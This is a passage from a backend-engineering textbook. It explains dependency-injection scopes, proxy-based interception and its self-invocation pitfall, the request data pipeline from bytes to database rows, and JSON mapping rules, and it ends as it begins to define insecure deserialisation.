            if requestScope is null: throw NoActiveRequest(type)
            if type in requestScope: return requestScope[type]

        if type in resolving: throw CircularDependency(resolving, type)
        resolving.add(type)
        try:
            instance = factory(t -> resolve(t, requestScope))   // the factory asks for its dependencies
        finally:
            resolving.remove(type)

        if scope == SINGLETON:   singletons[type] = instance; creationOrder.add(instance)
        if scope == PER_REQUEST: requestScope[type] = instance
        return instance                                         // TRANSIENT: new every time, never cached

    function beginRequest():  return map()                       // a fresh request scope
    function endRequest(requestScope):
        for instance in requestScope.values(): if instance has close(): instance.close()

    function shutdown():                                         // reverse order: users before what they use
        for instance in reverse(creationOrder): if instance has close(): instance.close()

// Registration: the composition root, now declarative
c = Container()
c.register(Config,             r -> loadConfig(),                                         SINGLETON)
c.register(ConnectionPool,     r -> ConnectionPool(r(Config).db.url, r(Config).db.poolSize), SINGLETON)
c.register(OrderRepository,    r -> SqlOrderRepository(r(ConnectionPool)),                SINGLETON)
c.register(ProductRepository,  r -> SqlProductRepository(r(ConnectionPool)),              SINGLETON)
c.register(Clock,              r -> SystemClock(),                                         SINGLETON)
c.register(PricingRules,       r -> PricingRules(),                                        SINGLETON)
c.register(Notifier,           r -> EmailNotifier(EmailApiClient(r(Config).email.apiUrl,
                                                                 r(Config).email.apiKey)), SINGLETON)
c.register(OrderService,       r -> OrderService(r(OrderRepository), r(ProductRepository),
                                                 r(PricingRules), r(Notifier), r(Clock)),  SINGLETON)
c.register(RequestContext,     r -> RequestContext(),                                      PER_REQUEST)
c.register(AuditLog,           r -> AuditLog(r(RequestContext), r(ConnectionPool)),       PER_REQUEST)
c.register(PriceQuote,         r -> PriceQuote(),                                          TRANSIENT)
```

A resolution trace for the first request shows what the container does:

```text
 resolve(OrderService)                         singleton, not built yet
 ├─ resolve(OrderRepository)                   singleton, not built yet
 │  └─ resolve(ConnectionPool)                 singleton, not built yet
 │     └─ resolve(Config)                      built → cached
 │     built ConnectionPool → cached
 │  built SqlOrderRepository → cached
 ├─ resolve(ProductRepository)
 │  └─ resolve(ConnectionPool)                 cached: the SAME pool is reused
 │  built → cached
 ├─ resolve(PricingRules), resolve(Notifier), resolve(Clock)   built → cached
 built OrderService → cached

 request 1:  scope1 = beginRequest()
             resolve(AuditLog, scope1)  → new RequestContext in scope1, new AuditLog in scope1
             resolve(AuditLog, scope1)  → same AuditLog (cached in scope1)
             endRequest(scope1)          → AuditLog closed
 request 2:  scope2 = beginRequest()
             resolve(AuditLog, scope2)  → a NEW AuditLog and RequestContext
```

Real containers add one thing this sketch leaves out: **auto-wiring**. Instead of writing a factory for each type, the container inspects the constructor's parameter types (by reflection at startup, or by generating code at build time) and resolves each one. The mechanism is the same.

### Mechanism 4: scopes and the scope-mismatch trap

| Scope | One instance per | Typical use | Must be |
|---|---|---|---|
| **Singleton** | container (the application) | services, repositories, pools, clients, configuration | stateless or thread-safe (Chapter 11, Section 11.6) |
| **Per-request** (request scope) | HTTP request | request context, per-request unit of work, audit with the current user | used only during that request |
| **Transient** (prototype) | each resolution | small stateful helpers, builders | cheap to create |
| **Session** | user session (Chapter 19) | rarely a good idea in stateless services | serialisable if sessions are shared |

The classic bug is a **scope mismatch**, also called a **captive dependency**: a long-lived object receives a shorter-lived one at construction and keeps it forever.

```text
 container start:  resolve(ReportService)   singleton
                   └─ needs RequestContext  per-request → built in the FIRST request's scope
                                                           (or startup fails with NoActiveRequest)

 request 1 (Alice):  reportService.context.user = Alice     ✔ looks right
 request 2 (Bob):    reportService.context.user = Alice     ✘ Bob's report uses Alice's tenant
 request 3 (Carol):  reportService.context.user = Alice     ✘ forever
```

The same happens with a transient injected into a singleton: it is built once, so "a new one every time" silently becomes "one shared by all threads". The fixes inject something that looks up the right instance **at call time**:

```pseudo
class ReportService:                                // singleton
    constructor(contextProvider):                    // a provider, not the context itself
        this.contextProvider = contextProvider
    function generate():
        ctx = contextProvider.get()                  // resolves in the CURRENT request's scope
        ...
```

A **scoped proxy** does the same automatically: the singleton receives a stand-in object whose every method call looks up the current request's real instance (Chapter 11, Section 11.6 described Spring's request-scoped proxy). Section 12.5 explains how such stand-ins are built.

### Mechanism 5: lifecycle and circular dependencies

A container also runs **lifecycle callbacks**: an initialisation method after injection (open files, warm caches, validate configuration) and a destroy method at shutdown. It closes singletons in **reverse** creation order, so a service stops before the pool it uses is closed (graceful shutdown in full is Chapter 24). Containers usually create singletons **eagerly** at startup, which turns a missing or broken dependency into a startup failure instead of a failure on the first request that needs it.

A **circular dependency** is a cycle in the object graph: `OrderService` needs `CustomerService`, which needs `OrderService`. With constructor injection, it cannot be built: neither object can be constructed before the other exists, and the container's `resolving` set detects the cycle. Some containers break cycles with setter or field injection or with proxies, but the cycle is a design signal (Section 12.1): two components each know too much about the other. The usual fixes are to extract the shared logic into a third component both can use, or to have one side publish an event the other listens to.

### Inversion of control, dependency injection and dependency inversion

Three similar names describe three different ideas, and interviews test the difference:

```text
 Inversion of Control (IoC)        WHO IS IN CHARGE of flow and object creation?
   the framework calls your code: routing calls your handler, the container builds your objects,
   the test runner calls your tests, the event loop calls your callbacks.

 Dependency Injection (DI)         HOW does an object get its collaborators?
   they are handed to it (constructor/setter), instead of created or looked up inside.
   One technique for achieving IoC of object creation.

 Dependency Inversion Principle    WHICH WAY do source-code dependencies point?
   (the "D" in SOLID)               high-level policy must not depend on low-level details;
                                    both depend on an abstraction, and the abstraction is
                                    defined by (owned by) the high-level side.

     without DIP:  OrderService ──► SqlOrderRepository          (policy depends on detail)
     with DIP:     OrderService ──► OrderRepository ◄── SqlOrderRepository
                                    (interface owned by the order module; the detail implements it)
```

You can inject a concrete `SqlOrderRepository` (DI without DIP), or depend on an interface but build its implementation yourself (DIP without DI). The two together are what make code substitutable and testable. Section 12.10 builds an architecture on the Dependency Inversion Principle.

> **Framework lens:** In Spring, the container is the `ApplicationContext`. It holds a **bean definition** (type, scope, how to construct) for each managed object, which Spring calls a **bean**. Definitions come from **component scanning** (classes annotated `@Component`, `@Service`, `@Repository`, `@Controller` in scanned packages) and from `@Bean` factory methods in `@Configuration` classes, which are exactly the factories of the sketch above. A class with a single constructor is constructor-injected without any annotation (since Spring 4.3); `@Autowired` marks injection points otherwise. When two beans match a type, startup fails with `NoUniqueBeanDefinitionException` unless one is marked `@Primary` or the injection point names one with `@Qualifier`. A missing bean fails startup with `UnsatisfiedDependencyException` caused by `NoSuchBeanDefinitionException`. The default scope is singleton; `@Scope("prototype")`, `"request"` and `"session"` change it, and `proxyMode = ScopedProxyMode.TARGET_CLASS` (or `ObjectProvider<T>`) avoids the captive-dependency bug. `@PostConstruct` and `@PreDestroy` are the lifecycle callbacks. Spring Boot, since version 2.6, refuses circular references by default and prints a report beginning "The dependencies of some of the beans in the application context form a cycle". One more step of the container matters for Section 12.5: after creating a bean, Spring passes it through **bean post-processors**, which may return a *different object* (a proxy) to be injected in its place.

> **Other runtimes:** Go applications typically wire dependencies by hand in `main` (pure DI), sometimes with a code generator (Google's Wire) that writes the wiring at build time. Python's FastAPI resolves per-request dependencies declared with `Depends`. In Node.js, NestJS provides a container similar to Spring's. The mechanism underneath is always the one in the sketch.

### Guarantees and non-guarantees

A container guarantees that each object receives the dependencies registered for its parameter types, that a singleton is created once **per container**, that a per-request object is shared within one request, and (with eager creation) that missing dependencies and constructor cycles are found at startup. It does **not** guarantee that singletons are thread-safe (Chapter 11, Section 11.6), that injected objects are decoupled (injecting a concrete class still couples to it), that "singleton" means one per process (two containers, or an object built with `new` outside the container, make two), or that scopes are compatible.

### Failure and diagnosis

- **Startup failures.** Missing, ambiguous or circular dependencies. Symptom: the process exits during startup; the container's error names the type and the chain of dependencies that needed it. Read the chain from the bottom: the last type is usually the misconfigured one.
- **Scope mismatch leaks.** One user's or tenant's data in another's request, always the data of whichever request came first after a restart. Evidence: the wrong value is constant until the next restart, which separates it from a race (which is intermittent). Fix: inject a provider or a scoped proxy.
- **"The singleton was created twice".** Two connection pools, two caches with different contents. Evidence: the startup log shows a pool being initialised twice; the database shows twice the expected connections. Causes: an object built with `new` in code in addition to the container's instance, or two application contexts. The hand-built copy also misses everything the container adds, such as transactions (Section 12.5).
- **Slow startup.** Scanning many packages, or eager singletons doing remote calls during initialisation. Evidence: startup timings per component (many containers can report them; otherwise, logs with timestamps). Fix: narrow scanning; never call remote services in constructors; defer warm-up to a readiness step (Chapter 10, Section 10.3).

> **Java lens:** To list what a running Spring Boot application actually built, the Actuator `beans` endpoint returns each bean, its scope, type and dependencies. A class name such as `OrderService$$SpringCGLIB$$0` in that list (or in a debugger) means the injected object is a proxy, which is the subject of the next section.

### Backend connection

Inject dependencies through constructors and assemble the graph in one composition root, with or without a container. Make shared resources (pools, clients, caches) singletons created once. Give every singleton no request data, and inject providers when a long-lived object needs a short-lived one. When the container refuses to start because of a cycle, change the design rather than the injection style.

---

## 12.5 Interception and Proxies: Decorators, Dynamic Proxies, AOP

### Definitions

A **cross-cutting concern** is behaviour that many unrelated methods need in the same form: starting and ending transactions, checking permissions, caching results, timing calls, retrying, logging. It "cuts across" the layers and features of Section 12.2.

**Interception** means running extra code before, after or around a method call without changing the method or its callers.

The **decorator pattern** wraps an object in another object with the same interface. The wrapper adds behaviour and then **delegates** (passes the call on) to the wrapped object. Callers cannot tell the difference, because they see only the interface.

A **proxy** is an object that stands in for another object, with the same interface, and controls access to it. Structurally a proxy and a decorator are the same thing (a wrapper that delegates); the names differ in intent. A decorator adds behaviour; a proxy controls access, for example by deciding whether to call the target at all, when to create it, or which real instance to use.

A **dynamic proxy** is a proxy whose class is generated at run time rather than written by hand. Every method call on it is routed to one generic **handler** function, which receives the target object, the method being called and its arguments.

**Aspect-oriented programming (AOP)** is a technique for writing each cross-cutting concern once, as an **aspect**, and applying it to many methods automatically. Section "Mechanism 3" below defines its vocabulary.

### Why it exists

Here is what transaction handling looks like when written by hand in every service method:

```pseudo
function placeOrder(customerId, command):
    tx = txManager.begin()
    try:
        ... business logic ...
        tx.commit()
        return order
    catch any as e:
        tx.rollback()
        throw e

function cancelOrder(orderId):
    tx = txManager.begin()
    try:
        ... business logic ...
        tx.commit()
    catch any as e:
        tx.rollback()
        throw e
// ... and the same nine lines in 200 other methods, plus permission checks, plus timing
```

The boilerplate buries the business logic, and with 200 copies some will be wrong: a missing rollback, a commit in the wrong place. The rule "every use case runs in a transaction" is written 200 times instead of once. The middleware chain of Chapter 10 (Section 10.6) solved the same problem for whole requests. Interception solves it for individual method calls inside the application.

### Mechanism 1: a decorator written by hand

```pseudo
interface OrderOperations:
    function placeOrder(customerId, command)
    function cancelOrder(orderId)

class OrderService implements OrderOperations:            // business logic only
    function placeOrder(customerId, command): ... ; return order
    function cancelOrder(orderId): ...

class TransactionalOrderOperations implements OrderOperations:   // the decorator
    target, txManager
    function placeOrder(customerId, command):
        tx = txManager.begin()
        try:
            result = target.placeOrder(customerId, command)       // delegate
            tx.commit(); return result
        catch any as e:
            tx.rollback(); throw e
    function cancelOrder(orderId):  ... the same shape ...

// composition root: callers receive the decorator, never the raw service
operations = TransactionalOrderOperations(OrderService(...), txManager)
controller = OrderController(operations)
```

The business class is clean, and the wiring decides what wraps it. Decorators compose: wrap the transactional decorator in a timing decorator, and that in a security decorator. But one hand-written decorator per interface per concern does not scale either: 40 services times 4 concerns is 160 wrapper classes, all of the same shape.

### Mechanism 2: a dynamic proxy

A dynamic proxy removes the repetition by writing the wrapper **once, for all methods**. The runtime generates a class that implements the target's interface (or extends its class), and every method of that class does the same thing: call the handler.

```pseudo
// Written once, for every service in the application
class TransactionHandler:
    txManager
    function invoke(target, method, args):
        if not method.hasAnnotation("Transactional"):
            return method.call(target, args)                  // pass straight through
        tx = txManager.begin()
        try:
            result = method.call(target, args)               // reflection: call the real method
            tx.commit(); return result
        catch any as e:
            tx.rollback(); throw e

// What the generated class amounts to (the runtime writes this, not you):
class OrderOperations$Proxy implements OrderOperations:
    target, handler
    function placeOrder(customerId, command):
        return handler.invoke(target, OrderOperations.placeOrder, [customerId, command])
    function cancelOrder(orderId):
        return handler.invoke(target, OrderOperations.cancelOrder, [orderId])
```

There are two ways to generate the proxy class:

| Technique | How it works | Limits |
|---|---|---|
| **Interface-based** | generate a class implementing the target's interfaces | the target must have an interface; only interface methods are intercepted |
| **Subclass-based** | generate a subclass at run time (bytecode generation) that overrides each method | final classes and final methods cannot be overridden, so cannot be intercepted; private methods are never intercepted |

> **Java lens:** The JDK's built-in `java.lang.reflect.Proxy.newProxyInstance(classLoader, interfaces, handler)` creates interface-based proxies, routing every call to an `InvocationHandler.invoke(proxy, method, args)`. Subclass-based proxies come from bytecode libraries (CGLIB, which Spring includes in repackaged form, and ByteBuddy).

### Mechanism 3: AOP, and how an annotation becomes behaviour

AOP gives the pieces of this mechanism names:

- An **aspect** is a module that implements one cross-cutting concern (transactions, security, caching).
- A **join point** is a point in execution where an aspect can run. In proxy-based AOP, the only join points are calls to methods on the proxy.
- A **pointcut** is a rule that selects join points: "every public method annotated `@Transactional`", or "every method in the `..service..` package".
- **Advice** is the code that runs at the selected join points: **before**, **after** (returning or throwing), or **around** (wrapping the call, deciding whether and how to call it). The transaction handler above is around advice.
- **Weaving** is applying aspects to the code. It can happen at **compile time** (a special compiler rewrites the classes), at **load time** (an agent rewrites classes as they are loaded), or at **run time** by proxies. Run-time proxies are the simplest and most common in application frameworks, and they cause the pitfall below.

An **annotation** (or attribute, or decorator syntax in some languages) is only **metadata**: a label attached to a class or method that code can read. `@Transactional` does nothing on its own. Something must read it and act. In a container-based framework that something is the container, at startup:

```text
 STARTUP (once per bean)
 1. container creates the real OrderService            target object
 2. a post-processor inspects its class: does any method match a pointcut?
       placeOrder has @Transactional  → yes
       findOrder  has @Cacheable      → yes
 3. it generates a proxy around the target, with the matching advice in order
 4. the container stores and injects the PROXY under the name "orderService"

 RUN TIME (every call)
   OrderController.orderService ──► [ security proxy layer ] ──► [ transaction layer ] ──► [ cache layer ] ──► OrderService
                                        check permission            begin / commit /          return cached value
                                        or throw 403                rollback                  or call and store
```

The controller holds a reference to the proxy, so its calls enter at the left and pass through every layer of advice. This is why the controller never calls `begin()` or `checkPermission()`, yet both happen: the object it was given is not the object you wrote.

### Concrete: transactional and caching wrappers, and the order of advice

```text
                          caller (controller)
                                │  orderService.findOrder(42)
                                ▼
      ┌──────────────────────── PROXY ─────────────────────────┐
      │  caching advice:  key = ("findOrder", 42)              │
      │     hit?  ── yes ──► return cached Order  ─────────────┼──► (no transaction, no DB)
      │     no                                                 │
      │      ▼                                                 │
      │  transaction advice:  BEGIN (read-only)                │
      │      ▼                                                 │
      │  target.findOrder(42)  ─────────► real OrderService ───┼──► SELECT … FROM orders WHERE id = 42
      │      ▼                                                 │
      │  transaction advice:  COMMIT                           │
      │  caching advice:  store result under ("findOrder", 42) │
      └────────────────────────────┬───────────────────────────┘
                                   ▼
                               Order 42
```

Order matters, exactly as for middleware. With the cache **outside** the transaction (as drawn), a cache hit costs no database connection at all. With the cache **inside**, every hit still begins and commits an empty transaction and holds a connection while doing so. For writes the order matters for correctness: a cache updated inside a transaction that later rolls back now holds a value the database never committed (Chapter 21 covers cache consistency).

### Concrete: the self-invocation pitfall

The proxy intercepts only calls that **go through the proxy**. A call from one method of the target object to another method of the same object uses `this`, which is the raw target, not the proxy. The advice never runs.

```pseudo
class ImportService:
    orders

    function importAll(rows):                 // no @Transactional
        for row in rows:
            try: this.importOne(row)          // ← call via `this`, NOT via the proxy
            catch InvalidRow as e: log.warn(e)

    @Transactional                            // intent: each row in its own transaction
    function importOne(row):
        order = orders.save(Order.from(row))           // INSERT INTO orders ...
        orders.saveLines(order, row.lines)             // INSERT INTO order_lines ... (may throw)
```

```text
 caller ──► [proxy] importAll()           no annotation → pass through, no transaction
              │
              └──► target.importAll(rows)
                     │
                     ├── this.importOne(row 1)     `this` = target  → advice SKIPPED
                     │      INSERT orders           autocommit: committed immediately
                     │      INSERT order_lines      autocommit: committed immediately
                     │
                     ├── this.importOne(row 2)     advice SKIPPED
                     │      INSERT orders           committed
                     │      INSERT order_lines  ✘   throws InvalidRow (bad product id)
                     │                              nothing to roll back: the order row stays
                     └── ...

 Result: row 2 leaves an order with no lines. The annotation was ignored, silently.
 No error, no warning. In a unit test that builds ImportService with `new`, there is
 no proxy at all, so the test cannot reveal this either (Section 12.12).
```

**Autocommit** (each statement is its own transaction, committed immediately) is what a database connection does when no transaction was started; Chapter 18 covers it. The same pitfall makes `@Cacheable` methods never cache when called internally, `@Async` methods run synchronously, and security annotations go unchecked.

The fixes, in order of preference:

1. **Move the method to another component.** Put `importOne` in `RowImporter` and inject it into `ImportService`. Now the call crosses an object boundary, through `RowImporter`'s proxy. This is usually also better design: the two methods had different responsibilities.
2. **Use programmatic control.** Call a transaction API directly inside the method (`txTemplate.execute(() -> importOne(row))`). Explicit, no proxy needed.
3. **Call through the proxy.** Inject the component's own proxy into itself (lazily) and call `self.importOne(row)`. It works but is confusing; most teams avoid it.
4. **Weave at compile or load time.** Bytecode weaving (AspectJ, in Java) rewrites the class itself, so internal calls are intercepted too. More powerful, more build complexity.

> **Framework lens:** Spring's `@Transactional`, `@Cacheable`, `@PreAuthorize`, `@Async` and `@Retryable` (from Spring Retry) are all implemented by proxies created by bean post-processors, exactly as above. Spring Boot creates subclass-based (CGLIB) proxies by default, even when the bean has an interface. Consequences to remember: self-invocation bypasses the advice; private methods are never intercepted; final classes cannot be proxied by subclassing; an object created with `new` is not a bean and has no proxy. By default, Spring rolls back a transaction for unchecked exceptions (`RuntimeException` and `Error`) but **commits** it when a checked exception propagates; `rollbackFor` changes that. With `logging.level.org.springframework.transaction=DEBUG` (or the logger of the specific transaction manager), each transaction logs a line such as `Creating new transaction with name [com.shop.ImportService.importOne]`; if the line is missing for a method you expected to be transactional, the proxy was bypassed.

> **Other runtimes:** Python decorators and TypeScript method decorators **replace the method on the class itself** at definition time, so `self.import_one(row)` also calls the decorated version: there is no separate proxy object, and no self-invocation gap. Go has no annotations or run-time proxies; cross-cutting concerns are written as explicit wrapper functions or middleware, which makes them visible but manual. The self-invocation pitfall belongs to **proxy-based** interception, not to annotations as such.

### Guarantees and non-guarantees

A proxy guarantees that every call **made through the proxy** passes through its advice, in a defined order. It does not guarantee interception of internal calls, private or final methods, calls made during the target's constructor, or calls on objects the container did not create. It also does not guarantee that advice composes correctly: the order of caching, transactions, security and retries is a design decision, and the default order is not always the right one. The overhead of a proxy call itself is small (a few extra method calls and some reflection); the work the advice does (opening a transaction) is what costs time.

### Failure and diagnosis

- **"The annotation does nothing".** No rollback after an exception, no caching, synchronous `@Async`. Causes: self-invocation, a private or final method, an object not created by the container, or (for rollback) a checked exception under default rules. Evidence: transaction debug logging shows no "creating new transaction" line for the method; the object's run-time class name has no proxy marker; the database shows each statement committed separately.
- **Partial writes.** A business operation half applied. Evidence: rows that should never exist alone (orders without lines). Diagnose as above; then check which entry point called the method.
- **"Transaction silently rolled back because it has been marked as rollback-only".** In Spring, an inner transactional method threw, marking the shared transaction for rollback; the outer method caught the exception and tried to commit. The outer commit fails with `UnexpectedRollbackException`. Fix: do not catch-and-continue inside one transaction; if parts must succeed independently, give each its own transaction through a separate component (fix 1 above).
- **Confusing stack traces.** Frames such as `CglibAopProxy`, `ReflectiveMethodInvocation` and `TransactionInterceptor` between your own frames are the proxy layers. Reading them tells you which advice was active for the failing call.

### Backend connection

Interception lets one rule ("every use case is a transaction", "every admin method checks a role") be written once and applied everywhere. Treat it as a mechanism with boundaries you must respect: put intercepted methods on public methods of container-managed components, call them from other components, decide the order of advice deliberately, and test them through the container (Section 12.12).

---

## 12.6 Request Data Flow: From Bytes to Rows and Back

### Definition

The **request data flow** is the sequence of representations a request's data passes through, and the transformations between them, from the bytes on the socket to the database and back to bytes in the response. Each transformation has an owner (a layer or framework component) and its own failure mode.

### Why it matters

When something is wrong with data (a field is silently dropped, a number loses precision, a date shifts by two hours, a client gets `400` with no useful message), the bug lives in one specific step of this pipeline. Knowing the steps, their order and who owns each one turns "the API is broken" into a short list of places to look. The pipeline is also where trust changes: data is untrusted until it has passed validation, and must never reach business logic or the database before that.

### Concrete: the pipeline

```text
  INBOUND
  ───────
  socket bytes            7b 22 69 74 65 6d 73 22 3a 5b ...                       [server, Ch 10]
      │ 1. framing + decoding    Content-Length / chunked; charset (UTF-8)        400, 413, 415
      ▼
  text                    {"items":[{"productId":"p-17","qty":2}],"coupon":"AUTUMN"}
      │ 2. parsing               tokens → JSON tree                               400 malformed JSON
      ▼
  JSON tree               object{ items: array[ object{productId: "p-17", qty: 2} ], coupon: "AUTUMN" }
      │ 3. binding               tree → request DTO; type conversion              400 wrong type
      ▼                          unknown fields: reject or ignore (Section 12.7)
  request DTO             PlaceOrderRequest{ items=[ItemRequest{productId="p-17", qty=2}], coupon="AUTUMN" }
      │ 4. shape validation      required, ranges, lengths, formats              400 / 422
      ▼   ════════════════════ TRUST BOUNDARY: below here, input is well-formed ══════════
      │ 5. mapping in            DTO → command with value objects                 422 (parse errors)
      ▼
  command                 PlaceOrder{ customer=CustomerId(81), items=[(ProductId("p-17"), Quantity(2))],
                                      coupon=CouponCode("AUTUMN") }
      │ 6. business logic        load entities, apply rules, change state         409, 422, 403, 404
      ▼                          (inside the transaction, Section 12.2)
  domain objects          Order{ id=9001, lines=[...], total=Money(3998,"EUR"), status=PLACED }
      │ 7. persistence           domain → rows (SQL / ORM, Chapter 18)            409 (constraint), 503
      ▼
  database rows           orders(9001, 81, 3998, 'EUR', 'PLACED')  order_lines(9001, 'p-17', 2, 1999)

  OUTBOUND
  ────────
  domain result           Order 9001 (committed)
      │ 8. mapping out           domain → response DTO; choose visible fields
      ▼
  response DTO            OrderResponse{ id="9001", status="PLACED", total="39.98", currency="EUR", items=[...] }
      │ 9. serialisation         DTO → JSON text; status, headers                 (500 if it fails before commit
      ▼                                                                             of the response, Ch 10)
  bytes                   HTTP/1.1 201 Created
                          Location: /api/orders/9001
                          Content-Type: application/json
                          {"id":"9001","status":"PLACED","total":"39.98","currency":"EUR","items":[...]}
```

Steps 1 to 4 belong to the framework and the presentation layer, steps 5 and 8 to the controller (or a mapping component it calls), step 6 to the service and domain, step 7 to the repository, and step 9 to the framework again. Section 12.8 turns the status codes in the right-hand column into a single mapping.

### Mechanism: what each step does, and what it must not do

1. **Framing and decoding.** The server determines where the body ends (Chapter 7, Section 7.3) and enforces body-size limits (Chapter 7, Section 7.15). It decodes bytes to text using the charset from `Content-Type`, normally UTF-8 (Chapter 7, Section 7.7). A body that is not valid UTF-8 should fail here, not produce garbled names later.
2. **Parsing.** A JSON parser reads the text as **tokens** (start object, field name, string, number, end array...) and either builds a tree or feeds the tokens straight into binding. Parsers that stream tokens avoid building the whole tree in memory, which matters for large bodies.
3. **Binding.** The mapper creates the DTO and fills its fields from the tokens, converting types: the JSON string `"2026-10-21T10:00:00Z"` to a timestamp, the number `2` to an integer. The rules for names, unknown fields, missing fields, numbers, dates and polymorphic types are decisions you configure (Section 12.7).
4. **Shape validation.** Declarative rules on the DTO: `items` not empty, `qty` between 1 and 100, `coupon` at most 32 characters. All errors are collected and reported together, so the client can fix everything in one round trip.
5. **Mapping in.** The DTO is converted into the domain's language: strings become value objects (`ProductId`, `CouponCode`), parsed with the "parse, don't validate" approach of Section 12.3. The authenticated caller's identity comes from the request context (Chapter 11, Section 11.6), **never** from the body: a `customerId` field in a request body is an invitation to act as another customer.
6. **Business logic.** The service loads entities, applies rules and changes state, inside the transaction.
7. **Persistence.** The repository turns domain objects into rows with parameterised SQL or an ORM. Database constraints are the final check (Section 12.3).
8. **Mapping out.** The result is converted to a response DTO, choosing exactly which fields are visible and formatting them for clients (money as a decimal string, identifiers as strings).
9. **Serialisation.** The mapper writes the DTO as JSON; the framework sets the status line and headers and writes the bytes (Chapter 10, Section 10.6).

### Concrete: a worked cost estimate

Every step costs CPU and memory, and at high throughput the conversions themselves become visible. Assume a 4 KB request body, a 6 KB response, and (as stated assumptions, to be measured on your own stack) 40 µs to parse and bind the request, 10 µs for validation and mapping, and 50 µs to map and serialise the response: about 0.1 ms of CPU per request for the data flow alone. At 2,000 requests per second that is 0.2 CPU-seconds per second, a fifth of a core, before any business logic. It also allocates thousands of short-lived objects per request (tokens, strings, DTOs, domain objects), which the garbage collector must reclaim (Chapter 2, Section 2.8). The lesson is not "avoid DTOs" (the conversions are cheap compared with a database round trip of 1 ms or more), but "measure before blaming the database", and avoid pathological cases: serialising a 50 MB response as one in-memory string, or converting a large list several times between near-identical types.

### Guarantees and non-guarantees

A well-defined pipeline guarantees that business logic receives only well-formed, typed input, that the caller's identity comes from authentication rather than from the body, and that clients see only fields chosen for them. It does not guarantee semantic correctness (that is step 6), uniqueness under concurrency (step 7's constraints), or that a client and a server agree on the meaning of a field: two systems can both parse `"2026-10-21T10:00:00"` and disagree on its time zone.

### Failure and diagnosis

| Symptom | Step | Typical cause | Evidence |
|---|---|---|---|
| `400` with "JSON parse error" | 2 | invalid JSON: trailing comma, single quotes, wrong `Content-Type` | the raw body, captured at the proxy or with `curl -v` (Chapter 7, Section 7.16) |
| A field the client sends is always null or zero | 3 | a name mismatch (`productID` vs `productId`, `snake_case` vs `camelCase`) silently ignored | compare the raw body with the DTO's property names; temporarily make unknown fields fail |
| Times shifted by hours | 3, 9 | timestamps without offsets interpreted in the server's local zone | timestamps without `Z` or `+hh:mm` in payloads; server time zone not UTC |
| Large IDs off by one or two in a browser | 9 | 64-bit integers above 2^53 parsed as JavaScript numbers (Chapter 7, Section 7.7) | IDs that end in `00` on the client but not in the database |
| Slow responses that do many queries | 8 | mapping out triggers lazy loading of related data, one query per item (the N+1 problem, Chapter 18) | query count per request in logs or traces |
| Stack overflow or endless output when serialising | 9 | a bidirectional relation (order → customer → orders → ...) serialised as a cycle | the exception names the serialiser; the classes are ORM entities, not DTOs |
| Internal fields in responses | 8 | an entity serialised directly | raw responses contain columns never meant to leave |

The last three share a root cause: serialising persistence objects instead of response DTOs.

### Backend connection

Draw this pipeline for every important endpoint and know which component owns each step. Keep the trust boundary explicit: nothing reaches step 6 that has not passed steps 1 to 5, and identity comes from the request context. Serialise DTOs, not entities. When data looks wrong, find the first step where the representation differs from what you expected.

---

## 12.7 Serialisation, Mapping Rules, and Insecure Deserialisation

### Definitions

Recall from Chapter 1 (Section 1.4) that **serialisation** converts in-memory data into a sequence of bytes that can be stored or sent, and **deserialisation** reconstructs in-memory data from those bytes.

**Object mapping** (or **data binding**) is serialisation between a format and a language's own objects: a mapper that turns JSON into instances of your classes and back.

A **schema** is the agreed description of a format's structure: which fields exist, their types, which are required. It can be written down (JSON Schema, Protocol Buffers definitions, OpenAPI) or exist only implicitly in the code on both sides.

**Polymorphic deserialisation** is deserialising into one of several possible types, chosen from information in the input: a `payment` field that is sometimes a card payment and sometimes a bank transfer.

**Insecure deserialisation** is a vulnerability in which untrusted input controls **which types** are instantiated, or which code runs, while being deserialised. In the worst case it gives an attacker remote code execution on the server. It is part of category A08, Software and Data Integrity Failures, in the 2021 OWASP Top 10.

### Why it exists

Objects in memory contain things that mean nothing outside the process: pointers to other objects, references to classes, open connections. To send data, a program must choose a format both sides understand and rules for mapping between that format and objects. The mapping is never fully automatic. Somebody decides what happens with a field that one side has and the other does not, how numbers and dates are written, and how the receiver knows which type to build. Defaults make these decisions silently, and some defaults are dangerous.

### Mechanism 1: how an object mapper works

A mapper keeps, for each class, a list of **properties**: each with a name in the format, a type, and a way to read and write it (a field, a getter and setter, or a constructor parameter). It builds this list once per class, by **reflection** (inspecting the class at run time) or by **code generation** at build time.

```pseudo
function deserialise(tokens, targetType):
    meta = propertiesOf(targetType)                       // cached per class
    values = map()
    expect(tokens.next() == START_OBJECT)
    while (token = tokens.next()) != END_OBJECT:
        name = token.fieldName
        prop = meta.find(name)
        if prop is null:
            if config.failOnUnknown: throw UnknownField(name, targetType)
            tokens.skipValue(); continue                  // ignored silently
        values[prop] = convert(tokens.nextValue(), prop.type)   // recursive for nested objects
    for prop in meta.required:
        if prop not in values: throw MissingField(prop)
    return construct(targetType, values)                  // constructor or setters

function serialise(object):
    out.write(START_OBJECT)
    for prop in propertiesOf(object.type):
        value = prop.read(object)
        if value is null and config.omitNulls: continue
        out.writeField(prop.name); writeValue(value)      // recursive; cycles must be detected
    out.write(END_OBJECT)
```

Note the last line of `deserialise`: the mapper **constructs objects and calls their code** (constructors, setters). For a plain DTO that code just stores values. The vulnerability in Mechanism 3 appears when the input can choose a class whose construction code does something else.

### Mechanism 2: the mapping decisions you must make

| Decision | Options | Recommendation and reason |
|---|---|---|
| Field naming | `camelCase`, `snake_case` | pick one per API and configure it globally; mismatches cause silently missing fields |
| Unknown fields on input | fail (`400`), or ignore | for **public request bodies**, failing catches client typos (`quantitiy`); for **reading other services' responses**, ignore, so they can add fields without breaking you (the **tolerant reader** principle) |
| Missing fields | null, a default, or an error | required fields must fail validation; never let a missing `quantity` become `0` silently |
| Absent versus null | indistinguishable in many mappers | for partial updates, "absent" means "leave unchanged" and `null` means "clear" (JSON Merge Patch, Chapter 7, Section 7.4); bind such requests to a structure that keeps the difference |
| Integers | 32-bit, 64-bit, arbitrary | IDs and amounts above 2^53 as strings in JSON, because JavaScript clients lose precision (Chapter 7, Section 7.7) |
| Decimals | binary floating point, decimal type | money as integer minor units or as a decimal string, never as a binary float |
| Dates and times | local, with offset, epoch numbers | instants in ISO 8601 with an offset (`2026-10-21T10:00:00Z`); store and process instants in UTC |
| Enumerations | fail on unknown value, or map to `UNKNOWN` | receivers of other services' data should accept new values gracefully; your own API's inputs should reject unknown values |
| Nulls on output | include or omit | choose one and keep it stable; clients come to depend on either |
| Binary data | Base64 in a string | Base64 is an encoding, not protection (Chapter 8, Section 8.2); large binaries belong in separate endpoints |

